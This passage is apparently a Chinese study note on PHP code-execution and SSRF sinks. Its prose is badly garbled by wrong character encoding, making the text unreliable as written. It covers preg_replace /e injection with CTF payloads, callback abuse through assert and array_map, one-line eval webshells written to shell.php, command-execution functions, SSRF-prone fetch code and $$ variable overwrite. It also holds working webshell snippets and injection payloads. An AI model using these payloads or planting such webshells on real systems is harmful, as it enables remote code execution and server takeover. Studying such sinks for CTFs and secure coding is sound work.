æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚ preg_replace()å‡½æ•°åŸæœ¬æ˜¯æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼Œä½†å› ä¸ºå­˜åœ¨å±é™©çš„/eä¿®é¥°ç¬¦ï¼Œä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ã€‚ï¼ˆæç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ï¼‰ è‡³äºä¸ºä»€ä¹ˆæˆ‘è¿™é‡Œ5.6éƒ½å¯ä»¥ï¼Œæ˜¯å› ä¸ºæˆ‘åœ¨phpstormä¸­è®¾ç½®çš„è¯­è¨€çº§åˆ«æ˜¯5.4 å¦å¤–è¿™é‡Œè¿˜éœ€å…¶ä»–å½¢å¼ï¼Œè¿™é‡Œç¨å¾®æ€»ç»“ä¸€ä¸‹ï¼Œæ—¥åå†è§åˆ°ï¼Œå°±è¡¥å……ã€‚ preg_replace('/(' . $re . ')/ei','strtolower(\"\\\\1\")',$strï¼‰ 1ã€/g è¡¨ç¤ºè¯¥è¡¨è¾¾å¼å°†ç”¨æ¥åœ¨è¾“å…¥å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ‰€æœ‰å¯èƒ½çš„åŒ¹é…ï¼Œè¿”å›çš„ç»“æœå¯ä»¥æ˜¯å¤šä¸ªã€‚å¦‚æœä¸åŠ /gæœ€å¤šåªä¼šåŒ¹é…ä¸€ä¸ª 2ã€/i è¡¨ç¤ºåŒ¹é…çš„æ—¶å€™ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¿™ä¸ªè·Ÿå…¶å®ƒè¯­è¨€çš„æ­£åˆ™ç”¨æ³•ç›¸åŒ 3ã€/m è¡¨ç¤ºå¤šè¡ŒåŒ¹é…ã€‚ä»€ä¹ˆæ˜¯å¤šè¡ŒåŒ¹é…å‘¢ï¼Ÿå°±æ˜¯åŒ¹é…æ¢è¡Œç¬¦ä¸¤ç«¯çš„æ½œåœ¨åŒ¹é…ã€‚å½±å“æ­£åˆ™ä¸­çš„^$ç¬¦å· 4ã€/s ä¸/mç›¸å¯¹ï¼Œå•è¡Œæ¨¡å¼åŒ¹é…ã€‚ 5ã€/e å¯æ‰§è¡Œæ¨¡å¼ï¼Œæ­¤ä¸ºPHPä¸“æœ‰å‚æ•°ï¼Œä¾‹å¦‚preg_replaceå‡½æ•°ã€‚ 6ã€/x å¿½ç•¥ç©ºç™½æ¨¡å¼ã€‚ æ˜ç™½äº†/eiæ˜¯ä»€ä¹ˆï¼Œå‘ç°\\\\ 1åˆä¸çŸ¥é“æ˜¯ä»€ä¹ˆäº† åå‘å¼•ç”¨ å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸å…³ åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜ â€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚ è¯´äººè¯å°±æ˜¯ï¼Œ\\è°ï¼Œå°±åŒ¹é…ç¬¬å‡ ä¸ªï¼Œå¦‚æœå¯¹äºå¦‚ä¸‹ä»£ç  &lt;?php function test($str) {} echo preg_replace(\"/s*[php](.+?)[/php]s*/ies\", 'test(\"\\1\")', $_GET[\"h\"]); æäº¤ ?h=[php]phpinfo()[/php]ï¼Œphpinfo()æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ï¼Œå› ä¸ºç»è¿‡æ­£åˆ™åŒ¹é…åï¼Œ replacement å‚æ•°å˜ä¸ºâ€™test(â€œphpinfoâ€)'ï¼Œæ­¤æ—¶phpinfoä»…æ˜¯è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°äº†ã€‚ åœ¨è¿™é‡Œæˆ‘ä»¬å¦‚æœæäº¤?h=[php]{${phpinfo()}}[/php]ï¼Œphpinfo()å°±ä¼šè¢«æ‰§è¡Œã€‚ åœ¨phpä¸­ï¼ŒåŒå¼•å·é‡Œé¢å¦‚æœåŒ…å«æœ‰å˜é‡ï¼Œphpè§£é‡Šå™¨ä¼šå°†å…¶æ›¿æ¢ä¸ºå˜é‡è§£é‡Šåçš„ç»“æœï¼›å•å¼•å·ä¸­çš„å˜é‡ä¸ä¼šè¢«å¤„ç†ã€‚ æ³¨æ„ï¼šåŒå¼•å·ä¸­çš„å‡½æ•°ä¸ä¼šè¢«æ‰§è¡Œå’Œæ›¿æ¢ã€‚ é˜²å¾¡åŠæ³• å°†'test(\"\\1\")' ä¿®æ”¹ä¸º\"test('\\1')\"ï¼Œè¿™æ ·â€˜${phpinfo()}'å°±ä¼šè¢«å½“åšä¸€ä¸ªæ™®é€šçš„å­—ç¬¦ä¸²å¤„ç†ï¼ˆå•å¼•å·ä¸­çš„å˜é‡ä¸ä¼šè¢«å¤„ç†ï¼‰ã€‚ ä¸¾ä¸ªCTFä¾‹å­ &lt;?php $id = $_GET['id']; $_SESSION['id'] = $id; function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str ); } foreach($_GET as $re =&gt; $str) { echo complex($re, $str). \" \"; } function getFlag(){ @eval($_GET['cmd']); } foreachå‡½æ•°å°†å‚æ•°å’Œå‚æ•°å€¼åˆ†åˆ«ç»™äº†$reå’Œ$strï¼Œ$reä½œä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œ$strä½œä¸ºè¦è¢«æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚è¦æ‰§è¡Œä¸Šé¢çš„æ¼æ´ï¼Œè¦æ­£åˆ™è¡¨è¾¾å¼å’Œå­—ç¬¦ä¸²åŒ¹é…èµ·æ¥ï¼Œäºæ˜¯ï¼ŒplayloadæŸ¥çœ‹phpinfo ?\\S*=${phpinfo()} è§£é‡Šä¸€ä¸‹ï¼š\\Sæ„æ€ä¸ºåŒ¹é…æ‰€æœ‰çš„å­—ç¬¦ï¼Œä¸€å®šè¦æ˜¯å¤§å†™Sï¼Œå¤§å°å†™æ˜¯æœ‰åŒºåˆ«çš„ [\\s]---è¡¨ç¤ºï¼Œåªè¦å‡ºç°ç©ºç™½å°±åŒ¹é…ï¼› [\\S]---è¡¨ç¤ºï¼Œéç©ºç™½å°±åŒ¹é…ï¼› åé¢çš„å€¼æ˜¯ä¸ªå˜é‡ï¼Œèƒ½è®©æ¼æ´æ‰§è¡Œè¿™ä¸ªå˜é‡ï¼Œè¿™ä¸ªå†å¼ºè°ƒä¸€æ¬¡ï¼Œåªæœ‰åœ¨åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¸­æ‰å¯ä»¥è§£æå˜é‡ï¼Œå•å¼•å·ä¸è¡Œ payloadå¦‚ä¸‹ï¼š ?\\S*=${getFlag()}&amp;cmd=show_source('/flag'); ?\\S*=${getFlag()}&amp;cmd=eval($_POST[pass]);--èšå‰‘ ?\\S*=${$_POST[pass]}--POSTä¼ å‚ create_funcion create_functionä¸»è¦ç”¨æ¥åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰ä¸¥æ ¼å¯¹å‚æ•°ä¼ é€’è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šå­—ç¬¦ä¸²ä¼ é€’ç»™create_function()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ string create_function(string $args , string $code ) $args å˜é‡éƒ¨åˆ† $code æ–¹æ³•ä»£ç éƒ¨åˆ†ï¼ˆè¦æ‰§è¡Œçš„ä»£ç ï¼‰ &lt;?php $func = create_function(\"\", $_POST['cmd']); $func(); ?&gt; array_map array_map()å‡½æ•°å°†ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åˆ°æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¸Šï¼Œå¹¶è¿”å›ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åçš„å¸¦æœ‰æ–°å€¼çš„æ•°ç»„ã€‚ å›è°ƒå‡½æ•°æ¥å—çš„å‚æ•°æ•°ç›®åº”è¯¥å’Œä¼ é€’ç»™array_map()å‡½æ•°çš„æ•°ç»„æ•°ç›®ä¸€è‡´ã€‚ array_map( callable $callback, array $array1[, array $â€¦] ) : array array_map()ï¼šè¿”å›æ•°ç»„ï¼Œæ˜¯ä¸º array1 æ¯ä¸ªå…ƒç´ åº”ç”¨ callbackå‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚ callback å‡½æ•°å½¢å‚çš„æ•°é‡å’Œä¼ ç»™ array_map() æ•°ç»„æ•°é‡ï¼Œä¸¤è€…å¿…é¡»ä¸€æ ·ã€‚ &lt;?php $func = $_GET['func']; $cmd = $_GET['cmd']; $array[0] = $cmd; $new_array = array_map($func, $array); ?&gt; call_user_func call_user_func æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨,å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚ &lt;?php @call_user_func(assert, $_GET['cmd']); ?&gt; call_user_func_array call_user_func_arrayæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•° &lt;?php $array[0] = $_GET['cmd']; @call_user_func_array(assert, $array); ?&gt; array_filter array_filter( array $array[, callable $callback[, int $flag = 0]] ) : array ä¾æ¬¡å°† array æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ° callback å‡½æ•°ã€‚å¦‚æœ callback å‡½æ•°è¿”å› trueï¼Œåˆ™ array æ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›çš„ç»“æœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿ç•™ä¸å˜ã€‚ &lt;?php $array[0] = $_GET['cmd']; $func = $_GET['func']; array(array_filter($array, $func)); ?&gt; usortä¸uasort usort() é€šè¿‡ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„è¿›è¡Œæ’åºã€‚ uasort() ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åºå¹¶ä¿æŒç´¢å¼•å…³è” ã€‚ php&gt;=5.6ï¼šå˜é•¿å‚æ•°æ˜¯PHP5.6æ–°å¼•å…¥çš„ç‰¹æ€§ï¼Œåœ¨PHPä¸­å¯ä»¥ä½¿ç”¨ func(â€¦$arr)è¿™æ ·çš„æ–¹å¼ï¼Œå°†$arræ•°ç»„å±•å¼€æˆå¤šä¸ªå‚æ•°ï¼Œä¼ å…¥funcå‡½æ•°ã€‚ &lt;?php //uasort(...$_GET); usort(...$_GET); ?&gt; phpç‰ˆæœ¬éšæ„ &lt;?php //uasort(...$_GET); usort($_GET, 'assert'); ?&gt; æ–‡ä»¶æ“ä½œå‡½æ•° file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚ fputs() å‡½æ•°å†™å…¥æ–‡ä»¶ &lt;?php $test = '&lt;?php eval($_POST[1]);?&gt;'; file_put_contents(\"shell.php\", $test); ?&gt; &lt;?php fputs(fopen('shell.php', 'w'), '&lt;?php eval($_POST[1]);?&gt;'); ?&gt; åŠ¨æ€å‡½æ•° PHPå‡½æ•°ç›´æ¥ç”±å­—ç¬¦ä¸²æ‹¼æ¥ &lt;?php $_GET['a']($_GET['b']); ?&gt; â€œ${@phpinfo()}â€ &lt;?php //echo \"${phpinfo()}\"; echo \"{${phpinfo()}}\"; ?&gt; å•å¼•å·ä¸å¯ä»¥ï¼ˆèŠ±æ‹¬å·ä¸­è¯­å¥å‰è¦åŠ ä¸ª@ ï¼Œä¸ç„¶ä¸è¡Œï¼‰ï¼ˆ@ ç©ºæ ¼ tab æ³¨é‡Šç¬¦ + -ç­‰ç¬¦å·éƒ½å¯ä»¥ï¼Œå°±æ˜¯ä¸èƒ½ç›´æ¥å†™ä»£ç ï¼‰ å‘½ä»¤æ‰§è¡Œå‡½æ•° exec function exec(string $command,array[optional] $output,int[optional] $return_value) phpä»£ç ï¼š &lt;?php exec('ipconfig', $v); print_r($v); ?&gt; çŸ¥è¯†ç‚¹ï¼š exec æ‰§è¡Œç³»ç»Ÿå¤–éƒ¨å‘½ä»¤æ—¶ä¸ä¼šè¾“å‡ºç»“æœï¼Œè€Œæ˜¯è¿”å›ç»“æœçš„æœ€åä¸€è¡Œï¼Œå¦‚æœä½ æƒ³å¾—åˆ°ç»“æœä½ å¯ä»¥ä½¿ç”¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œè®©å…¶è¾“å‡ºåˆ°æŒ‡å®šçš„æ•°ç»„ï¼Œæ­¤æ•°ç»„ä¸€ä¸ªè®°å½•ä»£è¡¨è¾“å‡ºçš„ä¸€è¡Œï¼Œå³å¦‚æœè¾“å‡ºç»“æœæœ‰20è¡Œï¼Œåˆ™è¿™ä¸ªæ•°ç»„å°±æœ‰20æ¡è®°å½•ï¼Œæ‰€ä»¥å¦‚æœä½ éœ€è¦åå¤è¾“å‡ºè°ƒç”¨ä¸åŒç³»ç»Ÿå¤–éƒ¨å‘½ä»¤çš„ç»“æœï¼Œä½ æœ€å¥½åœ¨è¾“å‡ºæ¯ä¸€æ¡ç³»ç»Ÿå¤–éƒ¨å‘½ä»¤ç»“æœæ—¶æ¸…ç©ºè¿™ä¸ªæ•°ç»„ï¼Œä»¥é˜²æ··ä¹±ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°ç”¨æ¥å–å¾—å‘½ä»¤æ‰§è¡Œçš„çŠ¶æ€ç ï¼Œé€šå¸¸æ‰§è¡ŒæˆåŠŸéƒ½æ˜¯è¿”å›ï¼ã€‚ è¿™é‡Œé‡åˆ°äº†printã€echoã€print_ræ‰“å°å‡½æ•°ï¼Œé—®é—®GPTçš„åŒºåˆ« æ”¾å‡ ä¸ªä¾‹å­ $message = \"Hello, World!\"; print $message; // è¾“å‡ºï¼šHello, World! $name = \"John\"; $age = 25; echo \"My name is \", $name, \" and I am \", $age, \" years old.\"; // è¾“å‡ºï¼šMy name is John and I am 25 years old. $cars = array(\"BMW\", \"Toyota\", \"Honda\"); print_r($cars); /* è¾“å‡ºï¼š Array ( [0] =&gt; BMW [1] =&gt; Toyota [2] =&gt; Honda ) */ printï¼š print ç”¨äºå°†å­—ç¬¦ä¸²è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆé€šå¸¸æ˜¯æµè§ˆå™¨æˆ–å‘½ä»¤è¡Œï¼‰ã€‚ print åªèƒ½æ‰“å°å­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œå¯¹äºå…¶ä»–æ•°æ®ç±»å‹ä¼šå°è¯•å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ print åœ¨ä½¿ç”¨æ—¶å¯ä»¥çœç•¥æ‹¬å·ï¼Œä¾‹å¦‚ print \"Hello, World!\";ã€‚ echoï¼š echo ç”¨äºå°†ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²æˆ–è¡¨è¾¾å¼è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚ echo æ²¡æœ‰è¿”å›å€¼ï¼Œå®ƒä¼šåœ¨è¾“å‡ºæ—¶ç›´æ¥å°†å†…å®¹å‘é€åˆ°æ ‡å‡†è¾“å‡ºã€‚ echo å¯ä»¥æ‰“å°å„ç§æ•°æ®ç±»å‹çš„å€¼ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²ã€æ•°å­—ã€å¸ƒå°”å€¼å’Œæ•°ç»„ç­‰ã€‚ print_rï¼š print_r æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥ä¼ é€’ä¸€ä¸ªå˜é‡ä½œä¸ºå‚æ•°ã€‚ print_r ç”¨äºä»¥æ˜“è¯»çš„æ–¹å¼è¾“å‡ºå˜é‡çš„ä¿¡æ¯ï¼Œé€šå¸¸ç”¨äºè°ƒè¯•å’Œæ‰“å°å¤æ‚çš„æ•°æ®ç»“æ„ï¼ˆå¦‚æ•°ç»„å’Œå¯¹è±¡ï¼‰ã€‚ print_r ä¼šé€’å½’åœ°éå†æ•°ç»„å’Œå¯¹è±¡ï¼Œå¹¶æ‰“å°å®ƒä»¬çš„é”®å’Œå€¼ï¼Œä»¥åŠå…¶ä»–ä¿¡æ¯ï¼ˆå¦‚ç±»å‹ã€é•¿åº¦ç­‰ï¼‰ã€‚ print_r çš„è¾“å‡ºç»“æœæ›´åŠ è¯¦ç»†å’Œå¯è¯»ï¼Œé€‚åˆç”¨äºå¼€å‘å’Œè°ƒè¯•ç›®çš„ã€‚ æ€»çš„æ¥è¯´ï¼šprint å’Œ echo æ›´é€‚åˆç®€å•çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œè€Œ print_r åˆ™æ›´é€‚åˆæ‰“å°å¤æ‚çš„æ•°æ®ç»“æ„ã€‚é€‰æ‹©ä½¿ç”¨å“ªä¸ªå‡½æ•°å–å†³äºä½ çš„å…·ä½“éœ€æ±‚å’Œè¾“å‡ºå†…å®¹çš„ç±»å‹ã€‚ passthru function passthru(string $command,int[optional] $return_value) &lt;?php passthru('ipconfig'); ?&gt; çŸ¥è¯†ç‚¹ï¼š passthruä¸systemçš„åŒºåˆ«ï¼Œpassthruç›´æ¥å°†ç»“æœè¾“å‡ºåˆ°æµè§ˆå™¨ï¼Œä¸éœ€è¦ä½¿ç”¨ echo æˆ– return æ¥æŸ¥çœ‹ç»“æœï¼Œä¸è¿”å›ä»»ä½•å€¼ï¼Œä¸”å…¶å¯ä»¥è¾“å‡ºäºŒè¿›åˆ¶ï¼Œæ¯”å¦‚å›¾åƒæ•°æ®ã€‚ system function system(string $command,int[optional] $return_value) &lt;?php system('ipconfig'); ?&gt; systemå’Œexecçš„åŒºåˆ«åœ¨äºsystemåœ¨æ‰§è¡Œç³»ç»Ÿå¤–éƒ¨å‘½ä»¤æ—¶ï¼Œç›´æ¥å°†ç»“æœè¾“å‡ºåˆ°æµè§ˆå™¨ï¼Œä¸éœ€è¦ä½¿ç”¨ echo æˆ– return æ¥æŸ¥çœ‹ç»“æœï¼Œå¦‚æœæ‰§è¡Œå‘½ä»¤æˆåŠŸåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚ç¬¬äºŒä¸ªå‚æ•°ä¸execç¬¬ä¸‰ä¸ªå‚æ•°å«ä¹‰ä¸€æ ·ã€‚ åæ’‡å·`å’Œshell_exec shell_exec() å‡½æ•°å®é™…ä¸Šä»…æ˜¯åæ’‡å· (`) æ“ä½œç¬¦çš„å˜ä½“ &lt;?php echo shell_exec('ipconfig'); echo (`ipconfig`); ?&gt; popenå‡½æ•°æ‰“å¼€è¿›ç¨‹ ä¸Šé¢çš„æ–¹æ³•åªèƒ½ç®€å•åœ°æ‰§è¡Œå‘½ä»¤ï¼Œå´ä¸èƒ½ä¸å‘½ä»¤äº¤äº’ã€‚ä½†æœ‰äº›æ—¶å€™å¿…é¡»å‘å‘½ä»¤è¾“å…¥ä¸€äº›ä¸œè¥¿ï¼Œå¦‚åœ¨å¢åŠ Linuxçš„ç³»ç»Ÿç”¨æˆ·æ—¶ï¼Œè¦è°ƒç”¨suæ¥æŠŠå½“å‰ç”¨æˆ·æ¢åˆ°rootæ‰è¡Œï¼Œè€Œsuå‘½ä»¤å¿…é¡»è¦åœ¨å‘½ä»¤è¡Œä¸Šè¾“å…¥rootçš„å¯†ç ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨ä¸Šé¢æåˆ°çš„æ–¹æ³•æ˜¾ç„¶æ˜¯ä¸è¡Œçš„ã€‚ resource popen ( string $command , string $mode ) å‡½æ•°éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ‰§è¡Œçš„å‘½ä»¤commandï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æŒ‡é’ˆæ–‡ä»¶çš„è¿æ¥æ¨¡å¼modeï¼Œæœ‰rå’Œwä»£è¡¨è¯»å’Œå†™ã€‚ å‡½æ•°ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯å‘½ä»¤å·²ç»æ‰§è¡Œã€‚ popen()æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„commandå‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿã€‚ è¿”å›ä¸€ä¸ªå’Œfopen()æ‰€è¿”å›çš„ç›¸åŒçš„æ–‡ä»¶æŒ‡é’ˆï¼Œåªä¸è¿‡å®ƒæ˜¯å•å‘çš„ï¼ˆåªèƒ½ç”¨äºè¯»æˆ–å†™ï¼‰å¹¶ä¸”å¿…é¡»ç”¨pclose()æ¥å…³é—­ã€‚ æ­¤æŒ‡é’ˆå¯ä»¥ç”¨äºfgets()ï¼Œfgetss()å’Œ fwrite() &lt;?php popen('ipconfig &gt;&gt; ./ip.txt', 'r'); ?&gt; &lt;?php $test=\"ls /tmp/test\"; $fp = popen($test, \"r\"); while(!feof($fp)){ $out = fgets($fp, 4096); echo $out; } pclose($fp); ?&gt; ä¸Šè¿°ä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„ PHP è„šæœ¬ï¼Œç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è¯»å–å…¶è¾“å‡ºã€‚ ä»¥ä¸‹æ˜¯å¯¹ä»£ç çš„è¯¦ç»†è§£é‡Šï¼š 1. `$test = \"ls /tmp/test\";`ï¼šå®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ `$test`ï¼Œå­˜å‚¨è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå‘½ä»¤æ˜¯ `ls /tmp/test`ï¼Œå®ƒå°†åˆ—å‡º `/tmp/test` ç›®å½•ä¸­çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚ 2. `$fp = popen($test, \"r\");`ï¼šä½¿ç”¨ `popen()` å‡½æ•°æ‰“å¼€ä¸€ä¸ªç®¡é“ï¼Œå¹¶æ‰§è¡Œç»™å®šçš„å‘½ä»¤ã€‚`$test` æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œ`\"r\"` è¡¨ç¤ºä»¥åªè¯»æ¨¡å¼æ‰“å¼€ç®¡é“ã€‚`popen()` å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œç”¨äºåç»­è¯»å–å‘½ä»¤çš„è¾“å‡ºã€‚ 3. `while(!feof($fp)){...}`ï¼šä½¿ç”¨ `while` å¾ªç¯è¯»å–ç®¡é“ä¸­çš„è¾“å‡ºã€‚`feof($fp)` å‡½æ•°åœ¨æ–‡ä»¶æŒ‡é’ˆåˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶è¿”å› `true`ï¼Œå› æ­¤ `while(!feof($fp))` è¡¨è¾¾å¼å°†åœ¨æ–‡ä»¶æŒ‡é’ˆæœªåˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶æ‰§è¡Œå¾ªç¯ä½“ã€‚ 4. `$out = fgets($fp, 4096);`ï¼šä½¿ç”¨ `fgets()` å‡½æ•°ä»ç®¡é“ä¸­è¯»å–ä¸€è¡Œæ•°æ®ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡ `$out` ä¸­ã€‚`$fp` æ˜¯æ–‡ä»¶æŒ‡é’ˆï¼Œ`4096` æ˜¯æ¯æ¬¡è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚ 5. `echo $out;`ï¼šå°†è¯»å–çš„è¡Œæ•°æ®è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚ 6. `pclose($fp);`ï¼šå…³é—­æ‰“å¼€çš„ç®¡é“ï¼Œé‡Šæ”¾ç›¸å…³èµ„æºã€‚ é€šè¿‡ä¸Šè¿°ä»£ç ï¼Œç³»ç»Ÿå‘½ä»¤ `ls /tmp/test` çš„è¾“å‡ºå°†è¢«é€è¡Œè¯»å–å¹¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚è¿™æ ·ï¼Œä½ å¯ä»¥åœ¨ PHP è„šæœ¬ä¸­æ‰§è¡Œå‘½ä»¤å¹¶å¤„ç†å…¶è¾“å‡ºã€‚è¯·æ³¨æ„ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤éœ€è¦è°¨æ…ï¼Œç¡®ä¿å‘½ä»¤çš„æ¥æºå’Œæ‰§è¡Œç¯å¢ƒçš„å®‰å…¨æ€§ã€‚ proc_open ä¸Popenå‡½æ•°ç±»ä¼¼ï¼Œä½†æ˜¯å¯ä»¥æä¾›åŒå‘ç®¡é“ pcntl_exec pathæ˜¯å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„æˆ–ä¸€ä¸ªåœ¨æ–‡ä»¶ç¬¬ä¸€è¡ŒæŒ‡å®šäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ ‡å¤´çš„è„šã€‚ argsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºçš„å‚æ•°çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚ pcntlæ˜¯linuxä¸‹çš„ä¸€ä¸ªæ‰©å±•ï¼Œéœ€è¦é¢å¤–å®‰è£…ï¼Œå¯ä»¥æ”¯æŒ php çš„å¤šçº¿ç¨‹æ“ä½œã€‚ pcntl_execå‡½æ•°çš„ä½œç”¨æ˜¯åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åºï¼Œç‰ˆæœ¬è¦æ±‚ï¼šPHP &gt; 4.2.0 SSRF file_get_contents ç›´æ¥ç”¨file_get_contents()åŠ è½½urlæŒ‡å‘æ–‡ä»¶ &lt;?php if (isset($_POST['url'])){ $content = file_get_contents($_POST['url']); $filename = './images/'.rand().';img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = \"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; } echo $img; ?&gt; å¦å¤–è¿™ä¸ªå‡½æ•°ä¹Ÿå¯ä»¥é…åˆPHPä¼ªåè®®è¿›è¡Œåˆ©ç”¨ï¼Œæ¯”å¦‚ï¼šphp://input fsockopen fsockopenå‡½æ•°ä¼šä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ® &lt;?php function GetFile($host, $port, $link){ $fp = fsockopen($host. intval($port), $errno, $errstr, 30); if(!$fp){ echo \"$errno (error number $errno) \"; } else{ $out = \"GET $link HTTP/1.1\\r \"; $out .= \"HOST: $host\\r \"; $out .= \"Connection: Close\\r \\r \"; $out .= \"\\r \"; fwrite($fp, $out); $contents = ''; while(!feof($fp)){ $contents .= fgets($fp, 1024); } fclose($fp); return $contents; } } ?&gt; curl_exec &lt;?php if(isset($_POST['url'])){ $link = $_POST['url']; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj, CURLOPT_URL, $link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result = curl_exec($curlobj); curl_close($curlobj); $filename = './curled/'.rand().'.txt'; file_put_contents($filename, $result); echo $result; } ?&gt; å˜é‡è¦†ç›– $$ &lt;?php foreach (array('_COOKIE', '_POST', '_GET') as $_request){ foreach ($$_request as $_key =&gt; $_value){ $$_key = addslashes($_value); echo $_key.\" \"; echo $$_key.\" \"; } } ?&gt; ä»¥ä¸Šä»£ç 